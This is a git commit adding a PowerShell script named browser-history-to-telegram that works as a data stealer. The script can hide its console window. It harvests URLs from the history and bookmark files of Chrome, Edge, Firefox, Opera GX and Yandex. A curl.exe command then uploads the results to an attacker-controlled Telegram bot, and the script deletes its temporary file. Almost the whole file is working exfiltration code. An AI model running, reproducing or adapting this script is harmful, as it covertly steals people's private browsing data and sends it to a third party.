e141675e1346469bb7aa72f14cb9b1a9cb5c5070
kr3v3tochka <113172330+kr3v3tochka@users.noreply.github.com>
2025-07-01 23:35:39 +0300

    Add files via upload

---
+++ browser-history-to-telegram/main.ps1
@@ -0,0 +1,71 @@
+# > Uncomment $hide='y' below to hide the console
+ 
+# $hide='y'
+if($hide -eq 'y'){
+    $w=(Get-Process -PID $pid).MainWindowHandle
+    $a='[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd,int nCmdShow);'
+    $t=Add-Type -M $a -Name Win32ShowWindowAsync -Names Win32Functions -Pass
+    if($w -ne [System.IntPtr]::Zero){
+        $t::ShowWindowAsync($w,0)
+    }else{
+        $Host.UI.RawUI.WindowTitle = 'xx'
+        $p=(Get-Process | Where-Object{$_.MainWindowTitle -eq 'xx'})
+        $w=$p.MainWindowHandle
+        $t::ShowWindowAsync($w,0)
+    }
+}
+
+
+$Token = "$tg"
+$URL='https://api.telegram.org/bot{0}' -f $Token
+
+$outpath = "$env:temp\browser_history.txt"
+"Browser History    `n -----------------------------------------------------------------------" | Out-File -FilePath $outpath -Encoding ASCII
+
+# Define the Regular expression for extracting history and bookmarks
+$Regex = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'
+
+# Define paths for data storage
+$Paths = @{
+    'chrome_history'    = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History"
+    'chrome_bookmarks'  = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Bookmarks"
+    'edge_history'      = "$Env:USERPROFILE\AppData\Local\Microsoft/Edge/User Data/Default/History"
+    'edge_bookmarks'    = "$env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\Bookmarks"
+    'firefox_history'   = "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\places.sqlite"
+    'opera_history'     = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\History"
+    'opera_bookmarks'   = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\Bookmarks"
+    'yandex_history'    = "$Env:USERPROFILE\AppData\Local\Yandex\YandexBrowser\User Data\Default\History"
+    'yandex_bookmarks'  = "$Env:USERPROFILE\AppData\Local\Yandex\YandexBrowser\User Data\Default\Bookmarks"
+}
+
+# Define browsers and data
+$Browsers = @('chrome', 'edge', 'firefox', 'opera', 'yandex')
+$DataValues = @('history', 'bookmarks')
+
+foreach ($Browser in $Browsers) {
+    foreach ($DataValue in $DataValues) {
+        $PathKey = "${Browser}_${DataValue}"
+        $Path = $Paths[$PathKey]
+        
+        if(Test-Path $Path) {
+            try {
+                $Value = Get-Content -Path $Path -ErrorAction SilentlyContinue | Select-String -AllMatches $regex | % {($_.Matches).Value} | Sort -Unique
+
+                $Value | ForEach-Object {
+                    [PSCustomObject]@{
+                        Browser  = $Browser
+                        DataType = $DataValue
+                        Content = $_
+                    }
+                } | Out-File -FilePath $outpath -Append
+            } catch {
+                # Silently continue if there's an error reading the file
+                continue
+            }
+        }
+    }
+}
+
+curl.exe -F chat_id="$ChatID" -F document=@"$outpath" "https://api.telegram.org/bot$Token/sendDocument" | Out-Null
+sleep 2
+Remove-Item -Path $outpath -Force
